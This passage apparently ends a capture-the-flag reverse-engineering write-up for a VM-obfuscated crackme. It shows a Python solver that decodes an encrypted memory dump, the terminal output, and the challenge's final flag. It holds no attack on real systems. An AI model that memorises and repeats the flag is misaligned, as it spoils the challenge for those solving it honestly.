    <span class="token keyword">global</span> membytes
    membytes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token comment">#open the encypted file and read bytes</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ram.bin'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> rambin<span class="token punctuation">:</span>
        membytes<span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>rambin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    counter  <span class="token operator">=</span><span class="token number">0</span>
    uvar2 <span class="token operator">=</span> <span class="token number">0</span>
    bvar1 <span class="token operator">=</span> <span class="token number">1</span>
    bvar3 <span class="token operator">=</span> <span class="token number">2</span>
    uvar2_response <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">while</span> uvar2_response<span class="token punctuation">:</span>
        counter <span class="token operator">+=</span><span class="token number">3</span>
        uvar2_response <span class="token operator">=</span> fun_00402270<span class="token punctuation">(</span>membytes<span class="token punctuation">[</span>counter<span class="token operator">+</span> <span class="token number">0xff</span> <span class="token operator">+</span> uvar2<span class="token punctuation">]</span><span class="token punctuation">,</span> membytes<span class="token punctuation">[</span>counter<span class="token operator">+</span><span class="token number">0xff</span> <span class="token operator">+</span> bvar1<span class="token punctuation">]</span><span class="token punctuation">,</span> membytes<span class="token punctuation">[</span>counter<span class="token operator">+</span> <span class="token number">0xff</span> <span class="token operator">+</span> bvar3<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> membytes<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running the above script in the terminal gets us our flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:vm$ python3 x.py
<span class="token punctuation">[</span><span class="token string">'F'</span>, <span class="token string">'L'</span>, <span class="token string">'A'</span>, <span class="token string">'G'</span>, <span class="token string">'&#123;'</span>, <span class="token string">'V'</span>, <span class="token string">'M'</span>, <span class="token string">'S'</span>, <span class="token string">'-'</span>, <span class="token string">'A'</span>, <span class="token string">'R'</span>, <span class="token string">'E'</span>, <span class="token string">'-'</span>, <span class="token string">'F'</span>, <span class="token string">'O'</span>, <span class="token string">'R'</span>, <span class="token string">'-'</span>, <span class="token string">'M'</span>, <span class="token string">'A'</span>, <span class="token string">'L'</span>, <span class="token string">'W'</span>, <span class="token string">'A'</span>, <span class="token string">'R'</span>, <span class="token string">'E'</span>, <span class="token string">'&#125;'</span>, <span class="token string">'\x00'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>After a successful decryption of the rambin contents, the <code>sub_4022E0</code> function return the pointer to the flag to main function as shown in the image below.</p>
<p><img data-src="/images/mal/retflag.png" alt="Return value of sub_4022E0"></p>
<p>Therefore main function calculates MD5 hash of the flag and outputs to message dialogbox using <strong>MessageBoxA</strong> function.</p>
<p>The correct flag for the vm challenge is <code>FLAG&#123;VMS-ARE-FOR-MALWARE&#125;</code></p>
]]></content>
      <tags>
        <tag>reverse</tag>
        <tag>vm</tag>
      </tags>
  </entry>
</search>
